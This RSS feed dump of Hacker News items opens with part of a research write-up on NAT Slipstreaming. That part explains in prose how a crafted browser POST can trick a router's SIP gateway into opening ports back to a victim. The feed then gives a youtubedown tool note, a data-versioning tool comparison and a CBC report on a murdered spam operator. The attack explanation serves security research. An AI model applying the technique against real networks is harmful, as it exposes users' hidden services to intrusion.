<li>"SIP packet" in new hidden form generated, containing internal IP to trigger Application Level Gateway connection tracking
<ul>
<li>"HTTP POST" to server on TCP port 5060 (SIP port) initiated, avoiding <a target="_blank" href="https://github.com/samyk/chromium/blob/2d57e5b8afc6d01b344a8d95d3470d46b35845c5/net/base/port_util.cc#L20-L90">restricted browser ports</a></li>
<li>POST data is "stuffed" to exact TCP segment size / packet boundary, then “SIP packet” appended and posted via web form</li>
<li><b>victim IP stack breaks the POST into multiple TCP packets, leaving the "SIP packet" (as part of POST data) in its own TCP packet without any accompanying HTTP headers</b></li>
<li>if browser alters size of multipart/form boundary (Firefox) or packet size changes for any other reason, size change is communicated back to client and client auto-resends with new size</li>
<li>when opening UDP port, SIP packet is sent over TURN protocol inside specially crafted <code>username</code> field forcing IP fragmentation and precise boundary control</li>
</ul></li>
<li>victim NAT sees proper SIP REGISTER packet on SIP port (with no HTTP data), triggering ALG to open any TCP/UDP port defined in packet back to victim
<ul>
<li>victim NAT rewrites SIP packet, replacing internal IP with public IP, hinting to attacker exploit was successful</li>
<li>even if victim NAT normally rewrites source ports, the ALG will still be forced to port forward to the attacker's port of choice as it believes victim machine opened that port and attacker sees new source port in arriving SIP packet </li>
<li><b>attacker can now bypass victim NAT and connect directly back to any port on victim's machine, exposing previously protected/hidden services</b></li>
</ul></li>
<li><i>to investigate...perhaps by you?</i>
<ul>
  <li>non-malicious usage: this technique essentially gives browsers full TCP and UDP socket capability to communicate to any protocol locally on the system; the connection can be abstracted through a cloud server that connects back but the browser just talks to the cloud server as if it's the socket and makes browsers much more powerful to communicate on non-web-friendly protocols</li>
  <li>if testing in a virtual machine (VM) using shared networking (used to protect a host from attacks by routing it through the host, not letting it directly onto the network), if the packets make it out, the parent host machine is where the ports end up getting opened, not the VM ;)</li>
  <li>IP fragmentation allows full control of all data in the IP data section, meaning full control of the <b>UDP header</b>, including source/dest ports in the overflowed packet...what else could this abuse?</li>
</ul></li>

<p><a target="_blank" href="https://raw.githubusercontent.com/samyk/slipstream/main/img/pinpkt2.png"><img src="https://raw.githubusercontent.com/samyk/slipstream/main/img/pinpkt2.png" alt="successful packet broken into valid SIP packet"></a></p>



<h2 id="network-address-translation-nat">Network Address Translation (NAT)</h2>

<p>We use NATs (Network Address Translation) for several reasons. The most useful feature of NAT is that it allows a single public IP address to be shared among multiple systems. It does this by creating a local network, providing local IP addresses to all machines that connect, and when one of those systems reaches out to the Internet, it rewrites packets going out to use the public IP so responses come back to the NAT, and vice versa, rewriting desination IP to specific client's IP. </p>

<p>It's the responsibility of the NAT to differentiate connections to the same addresses/ports (google.com:443) from internal hosts as ultimately their outbound port, destination ip and source ip will all be the same. If two different internal peers attempt to connect from the same source port, modern NATs will alter one of the source ports (some networks do this to all TCP/UDP source ports).</p>

<p><img src="https://raw.githubusercontent.com/samyk/slipstream/main/img/lan.png" alt="NAT"></p>

<h3 id="connection-tracking">Connection Tracking</h3>

<p>From <a target="_blank" href="https://www.wikiwand.com/en/Netfilter">Wikipedia ala Wikiwand</a>:</p>

<div><pre><code>One of the important features built on top of the Netfilter 
framework is connection tracking. Connection tracking 
allows the kernel to keep track of all logical network 
connections or sessions, and thereby relate all of the packets
which may make up that connection. NAT relies on this 
information to translate all related packets in the same way, 
and iptables can use this information to act as a stateful 
firewall.</code></pre></div>

<p>If a machine behind your NAT sends a packet out and your router expects the remote host may respond, it keeps track of information, specifically the source and destination ports, source and destination IP addresses, and your internal IP, then returns any packets matching it back to your internal IP.</p>

<p>If another host on your LAN attempts to make the same connection with the same source and destination ports + IPs, your NAT wouldn't be able to discriminate it (the source IPs are different on your LAN but are rewritten to the same public IP on the WAN side), so it alters the source port, but rewrites it when sending back to you.</p>

<h3 id="application-level-gateway">Application Level Gateway</h3>

<p>ALGs allow NAT to track a multi-port protocol like FTP to go out from your system to an FTP server, then track when you request a file to be sent to your internal IP on a specific port, the ALG can rewrite the packet to include your public IP, then forward the FTP's server connection back to you. Had it not rewritten your IP, the FTP server would try to connect back to you on your internal IP (or not try at all if it expects the source IP to be the same as the signaling connection).</p>

<p>From <a target="_blank" href="https://www.wikiwand.com/en/Application-level_gateway">Wikipedia</a>:</p>

<div><pre><code>In the context of computer networking, an application-level 
gateway consists of a security component that augments a 
firewall or NAT employed in a computer network. It allows 
customized NAT traversal filters to be plugged into the 
gateway to support address and port translation for certain 
application layer "control/data" protocols such as FTP, 
BitTorrent, SIP, RTSP, file transfer in IM applications, etc. 
In order for these protocols to work through NAT or a 
firewall, either the application has to know about an address/
port number combination that allows incoming packets, or the 
NAT has to monitor the control traffic and open up port 
mappings (firewall pinhole) dynamically as required. 
Legitimate application data can thus be passed through the 
security checks of the firewall or NAT that would have 
otherwise restricted the traffic for not meeting its limited 
filter criteria.</code></pre></div>

<h2 id="router-investigation--firmware-dumping">Router Investigation / Firmware Dumping</h2>

<p>I'd first like to see how common gateways actually treat packets and multi-port protocols like FTP, SIP, etc. To do this, we’ll want to reverse engineer the firmware from common routers. We could dump the flash from physical routers, however if we can get unencrypted firmware from the manufacturers, we’ll be able to investigate more router models and much faster.</p>

<p>We'll start with a common router, the Netgear Nighthawk R7000. A <a target="_blank" href="http://bfy.tw/NjZh">quick search</a> helps us …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://samy.pl/slipstream/">https://samy.pl/slipstream/</a></em></p>]]>
            </description>
            <link>https://samy.pl/slipstream/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24955891</guid>
            <pubDate>Sat, 31 Oct 2020 22:57:28 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Youtubedown Downloads from YouTube]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24955795">thread link</a>) | @ZnZirconium
<br/>
October 31, 2020 | https://blog.spiralofhope.com/15309/youtubedown.html | <a href="https://web.archive.org/web/*/https://blog.spiralofhope.com/15309/youtubedown.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="container">
	<div id="main" role="main">
													
<article id="post-15309">

	<div>
					<h2>youtubedown</h2>				
    <div>
            <p><a href="https://blog.spiralofhope.com/tag/commandline-software" rel="tag">commandline software</a>, <a href="https://blog.spiralofhope.com/tag/free-software" rel="tag">free software</a>, <a href="https://blog.spiralofhope.com/tag/freeware" rel="tag">freeware</a>, <a href="https://blog.spiralofhope.com/tag/glances" rel="tag">Glances</a>, <a href="https://blog.spiralofhope.com/tag/jamie-zawinskis-software" rel="tag">Jamie Zawinski's software</a>, <a href="https://blog.spiralofhope.com/tag/liked" rel="tag">liked</a>, <a href="https://blog.spiralofhope.com/tag/linux-software" rel="tag">Linux software</a>, <a href="https://blog.spiralofhope.com/tag/open-source-software" rel="tag">open-source software</a>, <a href="https://blog.spiralofhope.com/tag/perl-software" rel="tag">Perl software</a>, <a href="https://blog.spiralofhope.com/tag/vimeo" rel="tag">Vimeo</a>, <a href="https://blog.spiralofhope.com/tag/youtube" rel="tag">YouTube</a>          </p></div>
	</div>

	<div>
		<p><a href="https://blog.spiralofhope.com/11643/software.html">Software</a> (<a href="https://blog.spiralofhope.com/1721/youtube.html">YouTube</a>) &gt; </p>
<p><a href="https://www.jwz.org/hacks/youtubedown" target="_blank">https://www.jwz.org/hacks/youtubedown</a></p>
<p>Given a <a href="https://blog.spiralofhope.com/1721/youtube.html">YouTube</a> or <a href="https://blog.spiralofhope.com/12477/vimeo.html">Vimeo</a> URL, downloads the underlying video file, with a sensible file name. It downloads the highest resolution version of the video available: first it tries HD MP4, then regular MP4, then WebM, and finally FLV. It also works on playlists, and works as a <a href="https://blog.spiralofhope.com/22505/bookmarklets.html">bookmarklet</a> to download the video you're watching.</p>
<p>I liked it well enough.</p>

<hr>
<ul>
<li>
<p><a href="#2016-03-18">2016-03-18 - (version not recorded)</a> on <a href="https://blog.spiralofhope.com/3866/lubuntu.html">Lubuntu</a> (version not recorded)</p>
</li>
</ul>


<p>Usage:</p>
<pre>.<span>/</span>youtubedown.pl &nbsp;https:<span>//</span>www.youtube.com<span>/</span><span>watch</span>\?v\=jNQXAC9IVRw</pre>
<p><a href="#footnote_plugin_reference_15309_1"><sup id="footnote_plugin_tooltip_15309_1" onclick="footnote_moveToAnchor('footnote_plugin_reference_15309_1');">[&nbsp;1&nbsp;]</sup></a><span id="footnote_plugin_tooltip_text_15309_1"> 2020-10-29 - The URL format may be an anomaly from the automatic-modification that my <a href="https://blog.spiralofhope.com/3017/zsh.html">Zsh</a> does.  It may just be <code>https://www.youtube.com/watch?v=jNQXAC9IVRw</code> </span> </p>
<p>For higher quality stuff, it begs for <a href="https://blog.spiralofhope.com/6366/ffmpeg.html">FFmpeg</a>.</p>
<pre>\<span>sudo</span> &nbsp;\<span>apt-get</span> &nbsp;<span>install</span> &nbsp;<span>ffmpeg</span></pre>
	</div>

  

</article>
				



						</div><!-- end main -->

	<!-- end sidebar -->
</div></div>]]>
            </description>
            <link>https://blog.spiralofhope.com/15309/youtubedown.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-24955795</guid>
            <pubDate>Sat, 31 Oct 2020 22:42:46 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Comparing Data Version Control Tools – 2020]]>
            </title>
            <description>
<![CDATA[
Score 5 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24955520">thread link</a>) | @tolstoyevsky
<br/>
October 31, 2020 | https://dagshub.com/blog/data-version-control-tools/ | <a href="https://web.archive.org/web/*/https://dagshub.com/blog/data-version-control-tools/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
              
              <p>Whether you’re using logistic regression or a neural network, all models require data in order to be trained, tested, and deployed. Managing and creating the data sets used for these models requires lots of time and space, and can quickly become muddled due to multiple users altering and updating the data.</p><p>This can lead to unexpected outcomes as data scientists continue to release new versions of the models but test against different data sets. Many data scientists could be training and developing models on the same few sets of training data. This could lead to many subtle changes being made to the data set, which can lead to unexpected outcomes once the models are deployed.</p><p>This blog post discusses the many challenges that come with managing data, and provides an overview of the <strong>top tools for machine learning and data version control</strong>.</p><figure><img src="https://dagshub.com/blog/content/images/2020/11/Screen-Shot-2020-11-01-at-20.03.51.png" alt="Summary Comparison Table" srcset="https://dagshub.com/blog/content/images/size/w600/2020/11/Screen-Shot-2020-11-01-at-20.03.51.png 600w, https://dagshub.com/blog/content/images/size/w1000/2020/11/Screen-Shot-2020-11-01-at-20.03.51.png 1000w, https://dagshub.com/blog/content/images/size/w1600/2020/11/Screen-Shot-2020-11-01-at-20.03.51.png 1600w, https://dagshub.com/blog/content/images/2020/11/Screen-Shot-2020-11-01-at-20.03.51.png 1897w" sizes="(min-width: 720px) 720px"><figcaption>Summary Table - read further for a more detailed comparison</figcaption></figure><p>Managing data sets and tables for data science and machine learning models requires a significant time investment from data scientists and engineers. Everything from managing storage, versions of data, and access require a lot of manual intervention.</p><h2 id="storage-space">Storage Space</h2><p>Training data can take up a significant amount of space on Git repositories. This is because Git was developed to track changes in text files, not large binary files. So if a team's training data sets involve large audio or video files, this can cause a lot of problems downstream. Each change to the training data set will often result in a duplicated data set in the repositories’ history. This not only creates a large repository but also makes cloning and rebasing very slow.</p><h2 id="data-versioning-management">Data Versioning Management</h2><p>When trying to manage versions, whether it be code or UIs, there is a widespread tendency— even among techies—to “manage versions,” by adding a version number or word to the end of a file name. In the context of data, this means a project might include data.csv, data_v1.csv, data_v2.csv, data_v3_finalversion.csv, etc. This bad habit is beyond cliché, with most developers, data scientists, and UI experts in fact starting out<em> </em>with bad versioning habits.</p><figure><img src="https://images.unsplash.com/photo-1517490232338-06b912a786b5?ixlib=rb-1.2.1&amp;q=80&amp;fm=jpg&amp;crop=entropy&amp;cs=tinysrgb&amp;w=2000&amp;fit=max&amp;ixid=eyJhcHBfaWQiOjExNzczfQ" alt="Nine Eight Seven" srcset="https://images.unsplash.com/photo-1517490232338-06b912a786b5?ixlib=rb-1.2.1&amp;q=80&amp;fm=jpg&amp;crop=entropy&amp;cs=tinysrgb&amp;w=600&amp;fit=max&amp;ixid=eyJhcHBfaWQiOjExNzczfQ 600w, https://images.unsplash.com/photo-1517490232338-06b912a786b5?ixlib=rb-1.2.1&amp;q=80&amp;fm=jpg&amp;crop=entropy&amp;cs=tinysrgb&amp;w=1000&amp;fit=max&amp;ixid=eyJhcHBfaWQiOjExNzczfQ 1000w, https://images.unsplash.com/photo-1517490232338-06b912a786b5?ixlib=rb-1.2.1&amp;q=80&amp;fm=jpg&amp;crop=entropy&amp;cs=tinysrgb&amp;w=1600&amp;fit=max&amp;ixid=eyJhcHBfaWQiOjExNzczfQ 1600w, https://images.unsplash.com/photo-1517490232338-06b912a786b5?ixlib=rb-1.2.1&amp;q=80&amp;fm=jpg&amp;crop=entropy&amp;cs=tinysrgb&amp;w=2400&amp;fit=max&amp;ixid=eyJhcHBfaWQiOjExNzczfQ 2400w" sizes="(min-width: 720px) 720px"><figcaption>Photo by <a href="https://unsplash.com/@steve_j?utm_source=ghost&amp;utm_medium=referral&amp;utm_campaign=api-credit">Steve Johnson</a> / <a href="https://unsplash.com/?utm_source=ghost&amp;utm_medium=referral&amp;utm_campaign=api-credit">Unsplash</a></figcaption></figure><h2 id="multiple-users">Multiple Users</h2><p>When working in a production environment, one of the greatest challenges is dealing with other data scientists. If you’re not using some form of version control in a collaborative environment, files will get deleted, altered, and moved; and you will never know who did what. In addition, it will be difficult to revert your data to its original state. This is one of the biggest obstacles when it comes to managing models and datasets.</p><p>Data versioning is one of the keys to automating a team's machine learning model development. While it can be very complicated if your team attempts to develop its own system to manage the process, this doesn’t need to be the case.</p><p>Let’s explore six great, open source tools your team can use to simplify data management and versioning.</p><h2 id="dvc">DVC</h2><p><a href="https://dvc.org/">DVC</a>, or Data Version Control, is one of many available open-source tools to help simplify your data science and machine learning projects. The tool takes a Git approach in that it provides a simple command line that can be set up with a few simple steps. DVC doesn’t just focus on data versioning, as its name suggests. It also helps teams manage their pipelines and machine learning models. In the end, DVC will help improve your team's consistency and the <a href="https://thegradient.pub/independently-reproducible-machine-learning/">reproducibility of your models</a>.</p><h3 id="pros">Pros</h3><ul><li>Lightweight, open-source, and usable across all major cloud platforms and storage types.</li><li>Flexible, format and framework agnostic, and easy to implement.</li></ul><h3 id="cons">Cons</h3><ul><li>DVC version control is tightly coupled with pipeline management. This means if your team is already using another data pipeline tool, there will be redundancy.</li><li>DVC is lightweight, which means your team might need to manually develop extra features to make it easy to use.</li></ul><h2 id="delta-lake">Delta Lake</h2><p><a href="https://delta.io/">Delta Lake</a> is an open-source storage layer to help improve data lakes. It does so by providing ACID transactions, data versioning, metadata management, and managing data versions.</p><p>The tool is closer to a data lake abstraction layer, filling in the gaps where most data lakes are limited.</p><h3 id="pros-1">Pros</h3><ul><li>Offers many features that might not be included in your current data storage system, such as ACID transactions or effective metadata management.</li><li>Reduces the need for hands-on data version management and dealing with other data issues, allowing developers to focus on building products on top of their data lakes instead.</li></ul><h3 id="cons-1">Cons</h3><ul><li>Delta Lake is often overkill for most projects as it was developed to operate on Spark and on big data.</li><li>Requires using a dedicated data format which means it is less flexible and not agnostic to your current formats.</li><li>Tool’s primary purpose is to act more like a data abstraction layer, which might not be what your team needs and can detour developers in need of a lighter solution.</li></ul><h2 id="git-lfs">Git LFS</h2><p><a href="https://www.atlassian.com/git/tutorials/git-lfs">Git LFS</a> is an extension of Git developed by a number of open-source contributors. The software aims to eliminate large files that may be added into your repository (e.g., photos and data sets) by using pointers instead.</p><p>The pointers are lighter weight and point to the LFS store. Thus when you push your repo into the main repository, it doesn’t take long to update and doesn’t take up too much space.</p><p>This is a very lightweight option when it comes to managing data.</p><h3 id="pros-2">Pros</h3><ul><li>Integrates easily into most companies' development workflows.</li><li>Utilizes the same permissions as the Git repository so there is no need for additional permission management.</li></ul><h3 id="cons-2">Cons</h3><ul><li>Git LFS requires dedicated servers for storing your data. This, in turn, eventually leads to your data science teams being locked in as well as increased engineering work.</li><li>Git LFS servers are not meant to scale, unlike DVC, which stores data into a more general easy-to-scale object storage like S3.</li><li>Very specific and may require using a number of other tools for other steps of the data science workflow.</li></ul><h2 id="pachyderm">Pachyderm</h2><p><a href="https://pachyderm.io/">Pachyderm </a>is one of the few data science platforms on this list. Pachyderm’s aim is to create a platform that makes it easy to reproduce the results of machine learning models by managing the entire data workflow. In this regard, Pachyderm is “the Docker of data.”</p><p>Pachyderm leverages Docker containers to package up your execution environment. This makes it easy to reproduce the same output. The combination of both versioned data and Docker makes it easy for data scientists and DevOps teams to deploy models and ensure their consistency.</p><p>Pachyderm has committed itself to its <a href="https://www.pachyderm.com/dsbor/">Data Science Bill of Rights</a>, which outlines the product’s main goals: reproducibility, data provenance, collaboration, incrementality, and autonomy, and infrastructure abstraction.</p><p>These pillars drive many of its features and allow teams to take full advantage of the tool.</p><h3 id="pros-3">Pros</h3><ul><li>Based on containers, which makes your data environments portable and easy to migrate to different cloud providers.</li><li>Robust and can scale from relativity small to very large systems.</li></ul><h3 id="cons-3">Cons</h3><ul><li>More of a learning curve due to so many moving parts, such as the Kubernetes server required to manage Pachyderm’s free version.</li><li>With all the various technical components, it can be difficult to integrate Pachyderm into a company’s existing infrastructure.</li></ul><h2 id="dolt">Dolt</h2><p><a href="https://www.dolthub.com/docs/tutorials/installation/">Dolt</a> is a unique solution as far as data versioning goes. Unlike some of the other options presented that simply version data, Dolt is a database.</p><p>Dolt is an SQL database with Git-style versioning. Unlike Git, where you version files, Dolt versions tables. This means you can update and change data without worrying about losing the changes.</p><p>While the app is still new, there are plans to make it 100% Git- and MySQL-compatible in the near future.</p><h3 id="pros-4">Pros</h3><ul><li>Lightweight and partially open source.</li><li>SQL interface, making it more accessible for data analysts compared to more obscure options.</li></ul><h3 id="cons-4">Cons</h3><ul><li>Dolt is still a maturing product in comparison to other database versioning options.</li><li>Dolt is a DB, which means you must migrate your data into Dolt in order to get the benefits.</li><li>Built for versioning tables. That means that it won’t cover other types of data (e.g images, freeform text).</li></ul><h2 id="lakefs">LakeFS</h2><p><a href="https://lakefs.io/">LakeFS</a> lets teams build repeatable, atomic, and versioned data lake operations. It's a newcomer on this scene, but it packs a punch. It provides a Git-like branching and version control model that is meant to work with your data lake, scaling to Petabytes of data.</p><p>Similar to Delta Lake, it provides ACID compliance to your data lake. However, LakeFS supports both AWS S3 and Google Cloud Storage as backends, which means it doesn't require using Spark to enjoy all the benefits.</p><h3 id="pros-5">Pros</h3><ul><li>Provides advanced capabilities such as ACID transactions for easy-to-use cloud storage such as S3 and GCS, all while being format agnostic.</li><li>Scales easily, supporting very large data lakes. Capable of providing version control for both development and production environments.</li></ul><h3 id="cons-5">Cons</h3><ul><li>LakeFS is a relatively new product, so features and documentation might change more rapidly compared to other solutions.</li><li>Focused on data versioning, which means you will need to use a number of other tools for other steps of the data science workflow.</li></ul><p>For all the benefits of data versioning, you don’t always need to be investing a huge effort in managing your data. For example, much of data versioning is meant to help track data sets that change a great deal over time.</p><figure><img src="https://images.unsplash.com/photo-1484069560501-87d72b0c3669?ixlib=rb-1.2.1&amp;q=80&amp;fm=jpg&amp;crop=entropy&amp;cs=tinysrgb&amp;w=2000&amp;fit=max&amp;ixid=eyJhcHBfaWQiOjExNzczfQ" alt="Where is the love sung by The Black Eye Peas recreated in a tunnel underpass." srcset="https://images.unsplash.com/photo-1484069560501-87d72b0c3669?ixlib=rb-1.2.1&amp;q=80&amp;fm=jpg&amp;crop=entropy&amp;cs=tinysrgb&amp;w=600&amp;fit=max&amp;ixid=eyJhcHBfaWQiOjExNzczfQ 600w, https://images.unsplash.com/photo-1484069560501-87d72b0c3669?ixlib=rb-1.2.1&amp;q=80&amp;fm=jpg&amp;crop=entropy&amp;cs=tinysrgb&amp;w=1000&amp;fit=max&amp;ixid=eyJhcHBfaWQiOjExNzczfQ 1000w, https://images.unsplash.com/photo-1484069560501-87d72b0c3669?ixlib=rb-1.2.1&amp;q=80&amp;fm=jpg&amp;crop=entropy&amp;cs=tinysrgb&amp;w=1600&amp;fit=max&amp;ixid=eyJhcHBfaWQiOjExNzczfQ 1600w, https://images.unsplash.com/photo-1484069560501-87d72b0c3669?ixlib=rb-1.2.1&amp;q=80&amp;fm=jpg&amp;crop=entropy&amp;cs=tinysrgb&amp;w=2400&amp;fit=max&amp;ixid=eyJhcHBfaWQiOjExNzczfQ 2400w" sizes="(min-width: 720px) 720px"><figcaption>Photo by <a href="https://unsplash.com/@emilymorter?utm_source=ghost&amp;utm_medium=referral&amp;utm_campaign=api-credit">Emily Morter</a> / <a href="https://unsplash.com/?utm_source=ghost&amp;utm_medium=referral&amp;utm_campaign=api-credit">Unsplash</a></figcaption></figure><p>Some data, like web traffic, is only appended to. Meaning that data is added but rarely if ever changed. This means that the data versioning that is required to create reproducible results is the start and end dates. This is important to note, as in such cases, you might be able to avoid all the setup of the tools referenced above. You will still need to manage the start and end dates to ensure you’re testing on the same data every time, as well as the models you are creating. However, in these cases you won’t necessarily need to commit all the data to your versioning system.</p><p>Managing data …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://dagshub.com/blog/data-version-control-tools/">https://dagshub.com/blog/data-version-control-tools/</a></em></p>]]>
            </description>
            <link>https://dagshub.com/blog/data-version-control-tools/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24955520</guid>
            <pubDate>Sat, 31 Oct 2020 21:57:07 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Homicide victim found in burnt-out SUV ID'd as man behind spam-email empire]]>
            </title>
            <description>
<![CDATA[
Score 150 | Comments 77 (<a href="https://news.ycombinator.com/item?id=24955454">thread link</a>) | @goodcanadian
<br/>
October 31, 2020 | https://www.cbc.ca/news/canada/british-columbia/davis-wolfgang-hawke-missing-dead-1.5782107 | <a href="https://web.archive.org/web/*/https://www.cbc.ca/news/canada/british-columbia/davis-wolfgang-hawke-missing-dead-1.5782107">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><p>More than three years after his death, a man who was shot dead and found in a burnt-out SUV near Squamish, B.C., has been identified as a U.S. citizen known for spreading racist, neo-Nazi ideologies&nbsp;and for a massive spam email campaign that led to a $12.8-million US lawsuit.</p><div><figure><div><p><img loading="lazy" alt="" srcset="" sizes="" src="https://i.cbc.ca/1.5782212.1604017727!/fileImage/httpImage/image.jpeg_gen/derivatives/16x9_780/davis-wolfgang-hawke.jpeg"></p></div><figcaption>Davis Wolfgang Hawke was found dead in a burnt-out SUV in Squamish, B.C., on June 14, 2017. Police said his death was a homicide.<!-- --> <!-- -->(IHIT)</figcaption></figure><p><span><p>More than three years after his death, a man who was shot dead and found in a burnt-out SUV near Squamish, B.C., has been identified as a U.S. citizen known for spreading racist, neo-Nazi ideologies&nbsp;and for a massive spam email campaign that led to a $12.8-million US lawsuit.</p>  <p>Police found Davis Wolfgang Hawke dead on the Cheekye Forest Road, off the Sea to Sky Highway east of&nbsp;Paradise Valley, around 9:30 a.m. on June 14, 2017. Officers had been called about a burnt,&nbsp;red&nbsp;2000&nbsp;GMC&nbsp;Yukon XL on the side of the road.</p>  <p>An autopsy later confirmed the man had been shot dead,&nbsp;but&nbsp;for years&nbsp;the RCMP could not confirm his real name.</p>  <p>The Integrated Homicide Investigation Team (IHIT) only knew he&nbsp;went by the alias&nbsp;Jesse James, and that he was well known as an&nbsp;avid climber&nbsp;in Squamish, which is around 50 kilometres north of Vancouver.</p>  <p>But with IHIT's confirmation of his identity on Thursday, details about Hawke's past —&nbsp;including his fascist sympathies and a lucrative&nbsp;spam empire he built hawking loans, pornography, jewelry and prescription drugs — have come to light thanks to the work of an investigative journalist.</p>  <p><span><figure><div><p><img loading="lazy" alt="" srcset="https://i.cbc.ca/1.5782321.1604000520!/fileImage/httpImage/image.jpg_gen/derivatives/original_300/britt-greenbaum.jpg 300w,https://i.cbc.ca/1.5782321.1604000520!/fileImage/httpImage/image.jpg_gen/derivatives/original_460/britt-greenbaum.jpg 460w,https://i.cbc.ca/1.5782321.1604000520!/fileImage/httpImage/image.jpg_gen/derivatives/original_620/britt-greenbaum.jpg 620w,https://i.cbc.ca/1.5782321.1604000520!/fileImage/httpImage/image.jpg_gen/derivatives/original_780/britt-greenbaum.jpg 780w,https://i.cbc.ca/1.5782321.1604000520!/fileImage/httpImage/image.jpg_gen/derivatives/original_1180/britt-greenbaum.jpg 1180w" sizes="(max-width: 300px) 300px,(max-width: 460px) 460px,(max-width: 620px) 620px,(max-width: 780px) 780px,(max-width: 1180px) 1180px" src="https://i.cbc.ca/1.5782321.1604000520!/fileImage/httpImage/image.jpg_gen/derivatives/original_780/britt-greenbaum.jpg"></p></div><figcaption>Andrew Britt Greenbaum (aka Davis Hawke) at his grandparents' home in the U.S. in this undated picture. In posts online, his late mother said her son had been missing for years and that this was a cherished photo of her lost boy.<!-- --> <!-- -->(Facebook)</figcaption></figure></span></p>  <p>Brian McWilliams, author of the book <em>Spam Kings</em>, spent years tracking the young man, who&nbsp;he says lived a nomadic, risk-taking existence. He often travelled with half-wolf dogs, which were the only thing he appeared to be loyal to, according to McWilliams.</p>  <p>"It doesn't surprise me that this guy died in an inglorious and maybe a violent way. He was always living on the edge," McWilliams said.</p>    <p>McWilliams said Hawke,&nbsp;born Andrew Britt Greenbaum, changed his name many times and was&nbsp;evasive when the journalist was chasing him for a story on his junk-email&nbsp;empire.</p>  <p>He said Hawke and his associates bragged about making up to $300,000 in a year in the spam business, after dropping out of college.</p>  <p><span><figure><div><p><img loading="lazy" alt="" srcset="https://i.cbc.ca/1.5782537.1604017307!/fileImage/httpImage/image.jpg_gen/derivatives/original_300/andrew-britt-greenbaum.jpg 300w,https://i.cbc.ca/1.5782537.1604017307!/fileImage/httpImage/image.jpg_gen/derivatives/original_460/andrew-britt-greenbaum.jpg 460w,https://i.cbc.ca/1.5782537.1604017307!/fileImage/httpImage/image.jpg_gen/derivatives/original_620/andrew-britt-greenbaum.jpg 620w,https://i.cbc.ca/1.5782537.1604017307!/fileImage/httpImage/image.jpg_gen/derivatives/original_780/andrew-britt-greenbaum.jpg 780w,https://i.cbc.ca/1.5782537.1604017307!/fileImage/httpImage/image.jpg_gen/derivatives/original_1180/andrew-britt-greenbaum.jpg 1180w" sizes="(max-width: 300px) 300px,(max-width: 460px) 460px,(max-width: 620px) 620px,(max-width: 780px) 780px,(max-width: 1180px) 1180px" src="https://i.cbc.ca/1.5782537.1604017307!/fileImage/httpImage/image.jpg_gen/derivatives/original_780/andrew-britt-greenbaum.jpg"></p></div><figcaption>Greenbaum, who would later change his name to Hawke, grew up in a suburb of Boston and excelled at chess, before he branched into online spamming and vanished.<!-- --> <!-- -->(Facebook)</figcaption></figure></span></p>  <p>While IHIT&nbsp;said they had little information on Hawke, other than he was 38 when he died and was originally from the U.S.,&nbsp;McWilliams&nbsp;has gathered a lot of information about the "puzzling" young man who grew up in an affluent Boston suburb and was a chess prodigy.</p>  <p>McWilliams, who interviewed Hawke and his family, learned how he was bullied as a child&nbsp;for being small and Jewish —&nbsp;before he rejected&nbsp;his Jewish background,&nbsp;changed&nbsp;his name to Hawke&nbsp;and soon after became known to anti-racism groups as a neo-Nazi.</p>  <p>"At some point, he just became infatuated with this white supremacy notion," said McWilliams.</p>  <p>"He brought that mentality of everybody being inferior to him into the rest of his life," he said.</p>  <p>He organized a failed anti-government march in Washington, D.C., in 1999, and was written about in the New York Times and Rolling Stone magazine.</p>  <p><span><figure><div><p><img loading="lazy" alt="" srcset="https://i.cbc.ca/1.5782374.1604017399!/fileImage/httpImage/image.jpg_gen/derivatives/original_300/davis-wolfgang-hawke-forest-road.jpg 300w,https://i.cbc.ca/1.5782374.1604017399!/fileImage/httpImage/image.jpg_gen/derivatives/original_460/davis-wolfgang-hawke-forest-road.jpg 460w,https://i.cbc.ca/1.5782374.1604017399!/fileImage/httpImage/image.jpg_gen/derivatives/original_620/davis-wolfgang-hawke-forest-road.jpg 620w,https://i.cbc.ca/1.5782374.1604017399!/fileImage/httpImage/image.jpg_gen/derivatives/original_780/davis-wolfgang-hawke-forest-road.jpg 780w,https://i.cbc.ca/1.5782374.1604017399!/fileImage/httpImage/image.jpg_gen/derivatives/original_1180/davis-wolfgang-hawke-forest-road.jpg 1180w" sizes="(max-width: 300px) 300px,(max-width: 460px) 460px,(max-width: 620px) 620px,(max-width: 780px) 780px,(max-width: 1180px) 1180px" src="https://i.cbc.ca/1.5782374.1604017399!/fileImage/httpImage/image.jpg_gen/derivatives/original_780/davis-wolfgang-hawke-forest-road.jpg"></p></div><figcaption>The entrance to the Cheekye Forest Road as seen from the Sea to Sky Highway in Squamish, B.C. Hawke was found dead inside a burnt-out SUV along the road on June 14, 2017.<!-- --> <!-- -->(Google Street View)</figcaption></figure></span></p>  <p>Later he used his writing talents to trick people into sending him cash, and his spam email venture took off,&nbsp;according to court documents.</p>  <p>"He was a con man. He felt that he could convince anybody to buy herbal Viagra, just writing some clever email text. This guy was super intelligent and thought there was a sucker born every minute — and he was real good at finding them," said McWilliams.</p>    <p>In 2005, internet company AOL won a $12.8-million US judgment in federal court in Virginia against Hawke, who was accused of breaking federal law by sending massive amounts of unwanted spam emails to its customers. Hawke never showed for the trial.</p>  <p>Investigators believed he and his partners earned more than $600,000 on the spam sales pitches.</p>  <p>AOL also won a court order to dig up two properties owned by Hawke's relatives&nbsp;in Massachusetts to recoup costs, because&nbsp;Hawke had&nbsp;once bragged he buried gold and platinum in the yards, according to U.S. district court documents.</p>  <p>The company&nbsp;ultimately decided&nbsp;not to search the properties, which belonged to Hawke's grandmother and parents.</p>  <p>The family said no money was ever there.</p>    <p>A warrant for Hawke's arrest remained active.</p>  <p>Lawyers who worked on the case for AOL told CBC&nbsp;News on Thursday they 